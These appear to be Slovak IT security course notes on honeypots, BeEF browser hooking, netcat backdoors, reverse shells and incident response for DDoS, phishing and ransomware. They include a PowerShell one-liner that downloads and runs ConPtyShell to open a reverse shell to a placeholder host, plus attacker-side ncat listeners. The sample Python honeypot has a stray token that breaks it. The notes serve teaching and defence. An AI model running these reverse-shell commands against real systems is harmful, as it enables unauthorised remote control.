
[[GIT Version control softver]]  

### B.2 Medové hrnce - HONEPOTS A HONEYNETS

Umiestnením pasce na hackerov v určenom segmente, lákame Hackeov a Malware na návštevu. To čo sa zdalo pred chvíľou ako ľahká korisť, aktuálne zbiera dáta o útočníkovi a bije na poplach. Honeypoty sa navonok tvária ako zraniteľné počítače, ktoré majú otvorené porty, zraniteľný software alebo slabé heslo. V skutočnosti neobsahujú nič a ich úloha je indikovať kybernetický útok a informovať o tom svojho ŠERIFA.

#### B.2.1 JEDNODUCHÝ HONEYPOT V JAZYKU PYTHON3

``` python
import asyncio
import time

async def handle_connection(reader, writer):
	peername = writer.get_extra_info('peername')
	while True:  # nekonecny cyklus 
		data = await reader.read(1024)  # nacita byty
		if not data:
			break  # tak nic vrat sa do cyklu
		print(time.time(), peername, data.decode())   # zobraz na obrazovku
		writer.close()

async def main():
    server = await asyncio.start_server(handle_connection, '0.0.0.0', 23) # port 
    async with server:ls
    
        await server.serve_forever()  # server bez do nekonecna 

if __name__ == '__main__':
    asyncio.run(main())

```

#### B.2.2 CHAMELEON aj s grafickym rozhranim GRAFANA 
```bash
git clone https://github.com/qeeqbox/chameleon.git
cd chameleon
sudo chmod +x ./run.sh
sudo ./run.sh test
```

>[!info] HONEYPOTY
>Technickych rieseni pre implementaciu Honeypotov je mnozstvo. Od jednoduchych skriptov az po rozsiahle Honeynets kde prebieha ziva komunikacia medzi virtualnymi uzivatelmi.

#### B.2.3 CANARYTOKENS - 

Canarytokens sú generované súbory s pascami, ktoré pri neoprávnenej manipulácií pošlú správu užívateľovi.

https://canarytokens.org/nest/generate


## C. ZRANITELNOST WEB BROWSERA

Aj napriek všetkému zabezpečeniu si moderná doba vyžaduje aby na každom počítači bol Internetový prehliadač BROWSER. Tento BROWSER postupom času získal istú schopnosť, nielen komunikovať smerom k užívateľovi ale aj od užívateľa smerom k internetu. 

Získal kontrolu nad zaraideniami ako WEBKAMERY, MIKROFÓNY, uchováva HESLÁ, KOLÁČIKY, má priestor kde si vie ukladať údaje a súbory.

>[!warning  ]
>### NEPRIATEĽ POČÚVA  !!!


### C.1 DEMONŠTRÁCIA MOŽNOSTÍ FRAMEWORKU BEEF

Beef je exploitačný framework, ktorý sa tvári ako Web Server. Základom jeho fungovania je poskytovania falošnej stránky na ktorej beží skript hook.js


 ![BEEF Framework ](BEEF.png)

>[!info] 
>HACKER:  Pomocou hook.js vieme zahákovať browser podobne ako je to vo filmoch o pirátoch. Akonáhle je BROWSER zaháknutý môžeme ho pomocou príkazov ovládať a zbierať cenné informácie o užívateľovi.
> 


``` bash
sudo apt install beef-xss -y
```



## D. Zadné vrátka alebo Reverzné shelly

### D.1 Zadné vrátka

Možností ako si nechať otvorené zadné vrátka je veľa, môžeme využiť programovacie jazyky alebo softvér. 

Obľúbenými vrátkami je nechať spustený softvér ako Teamviewer alebo iný spôsob vzdialeného prístupu v určitom čase. Občas stačí premenovť súbor a nechať ho bežať ako démona. 

#### D.1.1 ZADNÉ VRÁTKA POMOCOU NETCAT

Netcat je užitočná sieťová utilitka, ktorá nám umožňuje na jednej strane počúvať LISTENER čosi ako stetoskop a na druhej strane vysielať, čosi ako mikrofón. Počúvame samozrejme nie zvuk ale sieťovú prevádzku pomocou SOCKETOV spojenia IP adresy počítača a čísla PORTU.

Na jednom PC  pustíme LISTENER:
``` bash
sudo apt-get update
sudo apt-get install ncat

ncat -lk -p 6868   # počítač počúva na porte 6868 na svojej IP

```


Na druhej strane  sa napojíme na LISTENER a začneme mu posielať data v podobe súboru alebo textu.
``` bash
ncat IP_ADRESA PORT
```



>[!info] 
>HACKER:  Tento prístup je však limitovaný a umožňuje iba jednoduché príkazy v shell


### D.2 REVERZNÝ SHELL NA WINDOWS

Väčšina sietí ma striktne nastavenú politiku čo može do siete sby sme ju ochránili od vonkajších hrozieb. Najväčšia bezpečnostná hrozba je však vo vnútri siete, nepreškolený alebo hlúpy užívateľ prípadne priveľmi sebavedomý SYSADMIN.

Pri REVERSE SHELL nás kontaktuje PC z chránenej LAN a ponúka nám prístup k svojmu príkazovému riadku. Stačí len nastaviť kde nás má kontaktovať a vždy keď sa ozve tak nás nakontaktuje sám. Prejde cez Firewall ako legitímna komunikácia z vnútra siete.

LISTENER NA STRANE ÚTOČNÍKA
``` bash
ncat -lvnp 6868 -s IP HOST
```


REVERSE SHELL POMOCOU SKRIPTU V POWERSHELL:

>[!warning  ]
>### NEPRIATEĽ POČÚVA  !!! Tento skript je NEBEZPEČNÝ A BOL STIAHNUTÝ Z GITHUBU !!! 

[antonioCoco · GitHub] (https://github.com/antonioCoco) a je voľne šírený pod MIT licenciou.
Autor je Analytik Malware a reverzný inžinier pre Windows.

``` powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell IP HOST  6868
```

>[!info] 
>SYSADMIN:  V našom prípade všetko dopadlo dobre, škodlivý kód zachytil ANTIVIR a zabránil mu v poskytnutí údajov cieľovému serveru. Štandardne je tiež v ExecutionPolicy Windows, že nemá spúšťať žiadne ps1 skripty.


## F. IT SEC CLUSTER A WARGAMING

### F.1 IT SEC ONLINE VZDELAVANIE

V rámci toho kurzu som Vám ukázal množstvo vecí, ktoré by ste mali teoreticky aj prakticky ovládať ak sa chcete venovať IT SEC. Problém je, že aj keď sme si nejaké veci ukazovali na mojej cvičnej sieti v tzv. HACKLABE či už na virtuálnych zariadeniach, alebo na skutočných, **praktické schopnosti získate iba sami**. Aby sme Vám túto cestu uľahčili vytvorili sme pre Vás sieť do ktorej sa budete pripájať a skúšať si rôzne ITSEC a hackerské nástroje cez Linux Shell.

Vnútorná sieť je oddelená od internetu a preto sa na ňu dá napojiť pomocou BRIDGU z internetu prostredníctvom SSH pripojenia.


### F.2 WARGAMING - HACKERSKE HRY

FORTIS AURIS o.z okrem vzdelávania a bezplatného poradenstva či osvety, vytvára VIRTUALNE BOJISKA A SCENARE PRE HACKEROV.  Medzi Hackermi sú obľúbené najmä:

<li>CTF získaj vlajku</li>
<li>DOMINATION obsaď najväčšiu časť CLUSTRA</li>
<li>HACKATHON spoločné riešenie problému</li>
<li>THREAT HUNT </li>
<li>ďalšie</li>


# http://188.121.170.77  JE TERAZ DOWN

``` bash & powershell
ssh itsec2023@188.121.170.77
```

Na vnútornom perimetri budú pre Vás pripravené počítače na ktorích  môžete využívať :

<li>ping traceroute ifconfig</li>
<li>skenovanie nmap</li>
<li>crackovanie hesiel pomocou hashov roznych uzivatelov</li>
<li>komunikovat s pripojenymi uzivatelmi pomocou wall, who, talk</li>
<li>pisanie pythonovskych skriptov v Python3</li>
<li>nastavovanie firewallov pomocou UFW a iptables</li>
<li>jednoduche socketservery a honeypoty</li>
<li>vytvarat jednoduche webservery a prezerat ich html stranky pomocou links2</li>


>[!info  ]
>### HESLO DO CLUSTRA VAM BUDE NA POZIADANIE ZASLANE V ZOOM CHATE.



# A. Incidenty, Prevencia a Opatrenia
#incidentresponse

1. PLAN (DEFINOVANE CSIRT, MENA, KOMPETENCIE, ZDROJE, NASTROJE, CASOVY HARMONOGRAM)

2. REALIZACIA OPATRENI
FAZA 1 -IDENTIFIKÁCIA INCIDENTU
FAZA 2 IZOLÁCIA INCIDENTU
FAZA 3 ANALÝZA DAT O INCIDENTE
FAZA 4 ODSTRÁNENIE NAKAZY
FAZA 5 OBNOVA SYSTEMU 
FAZA 6 POUČENIE, ANALYZA POSTUPOV PLANOV A CHYB



## A.1 DDOS - Distributed Denial of Services

>[!warning]
>IT SEC: Neustale monitorujte mnozstvo komunikacie na vonkajsich portoch serverov v DMZ !!!

>[!info] 
>HACKER:  Utok spociva v navyseni dopytu na server s mnozstva neznamych IP adries cim dochadza k pretazeniu servera a nestiha servovat odpovede. Pre beznych klientov bude Vas server nepristupny a sluzba prestane fungovat. Dlhodobe zatazenie moze sposobit aj dalsie technicke problemy. 

Utok ma dve podoby... jedna je rychlo posielat requesty na server a druha je zdrzovat TCP spojenie a poskytovanie poziadaviek


A.1.1 PREVENCIA

a. Preverte u ISP a poskytovatela hostingu, Cloudu a domeny moznosti tzv. MITIGACIE v pripade utoku. 

b. Pripravte WHITELIST kritickych odberatelov sluzieb

c. Prioritizujte stalych odberatelov

d. Pripravte moznosti presmerovat Traffic na ine zalozne servery a tym kratkodobo navysite kapacitu sluzby. 


UKÁŽKA	
``` bash
hping3 
```


### A.1.2 OPATRENIA

Ak spozorujete masivny nárast prichádzajúceho trafficu na port pokračujte podľa prichystaného plánu. Packety pôjdu z veľkého množstva IP adries a prvá a najväčšia línia obrany vznikne u Vašeho IS, Webhostingu či  poskytovateľa Internetu alebo Cloud na ktorom beží Váš server. Platí, že čím väčší provider služby tým väčšie sú jeho možnosti Mitigácie a odrazenia útoku.

V tomto momente aktivujte Whitelisty svojich stálych a d§ležitých zákazníkov pre ktorích musíte servis udržať ONLINE.

Navýšte krátkoddobo kapacitu Vašeho servera čo sa týka jeho výkonu aj sieťových rozhraní.

Dokumentujte odkiaľ útok ide a skúste zistiť PREČO.

LOIC Low Orbit Ion Canon

>[!info] PRIKLAD ANONYMOUS vs. SAUDSKÁ ARÁBIA
>



## A.2 - PHISHINGOVÁ KAMPAŇ

A.2.1 PREVENCIA

>[!info] 
>IT SEC: Cieľom Phishingovej kampaňe je aby užívateľ poskytol útočníkovi bud svoje prihlasovacie údaje k službe, alebo spustenie škodlivého kódu pomocou linku či súboru. 

a. Najefektívnejšou prevenciou je preškolenie USEROV a upozornenie ich na možnosti a ciele útočníkov. Čím je útok viac cielený bude aj náročnejšie odhaliť phishingový mail.

b. Ďalším preventívnym opatrením nepoužívanie Endpointov a Serverov v chránenej sieti na súkromné využitie. Tým sa vyrieši veľa problémov s falošnými prihlasovacími formulármi do Sociálnych sietí , Internetbankingu a pod.

c. Dobrý nápad je aj zakázanie preposielania typov súborov, ktoré môžu obsahovať škodlivý kód.
 
A.2.2 OPATRENIA

a. Preveriť koľko užívateľov dostalo takýto mail.  Kvalita toho Phishingu. Whaling

b. Vylúčiť možnosť, že na neho niekto klikol a to aj pohovorom aj kontrolou sieťovej prevádzky, logov a AV.

c. Identifikovať ZDROJ odkiaľ prišiel a zakázať ho na Firewalle alebo Filtroch.

d. Zachovať kópiu mailu a prílohy na forenzné skúmanie.

>[!warning] 
>ITSEC: AK SA ODHODLATE VYSKÚŠAŤ SVOJE SCHOPNOSTI A SKÚMAŤ ROB TO OPATRNE VO SVOJOM HACKLABE = NA ŠPECIÁLNE VYTVORENOM PC VO VM IZOLOVANOM SANDBOXE.

>[! demo]
>SET - SOCIAL ENGENEERING TOOLKIT - zrodenie Phishingoveho mailu.



## A.3 - MALWARE / RANSOMWARE infekcia

INFO: Cieľom hackera je získať prístup k informáciám, výpočtového výkonu, kryptomene či znehodnotiť dáta a vypýtať si odmenu za ich opätovné sprístupnenie. RANSOMWARE sa väčšinou prihlási po zašifrovaní dát a vypýta si odmenu. PENIAZE NIKOMU NEDÁVAJTE 

### A.3.1 PREVENCIA

a. BIOS Ochrana proti zapisu - pravdepodobnost mala ale treba najnovsi FIRMWARE

b. BROWSER na firemne veci(vypnuta Java, ActiveX a pod) a iny na sukromne

c. Virtualizacia aplikacii  

>[! demo]
>DOCKER  - SANDBOXING - kontajner s vlastnym VOLUME (diskom)
>PODMAN - 


d. IDS, IPS, AV, Logy a všetko čo nám pomôže kedy a ako sa dostal Malware do siete a určí aj rozsah infekcie.

e. Systém rýchlej obnovy z BACKUPOV

>[!info]
>AK  STE BOLI NAPADNUTÝ RANSOMWARE  neklesajte na duchu - KAVALERIA JE UZ NA CESTE. Desiatky ľudí pracujú na tom aby Vaše dáta zachránili. Títo neviditeľní hrdinovia hľadajú cestičku ako prelomiť šifrovanie a väčšinou to chvíľu trvá. DISK OZNAČTE A ODLOŽTE DO SKRINE. O NEJAKÝ ČAS HO POMOCOU NEJAKÉHO NÁSTROJA ODŠIFRUJETE.

### A.3.2 OPATRENIA :


1. Identifikacia MALWARE a infikovanych HOSTOV

2. Izolacia IZOLACIA INFIKOVANEJ CASTI SIETE - zabranenie sirenia

>[ !toolbox ] 
>POUŽI NÁSTROJE: CONTENT FILTER, IPS na LAN, BLACKLIST, 
>vypnutie sluzieb, portov,
>odpojenie zo siete - COMMAND AND CONTROL

Sledovanie jeho komunikacie pomocou IDS - CUSTOM SIGNATURE

3. Dezinfekcia pomocou AV

4.  REINSTALACIA - Admin pristup, Manipulacia so systemovymi subormi, Backdoor, nestabilita, Pochybnosti

5. ANALYZA UCINNOSTI A PLANU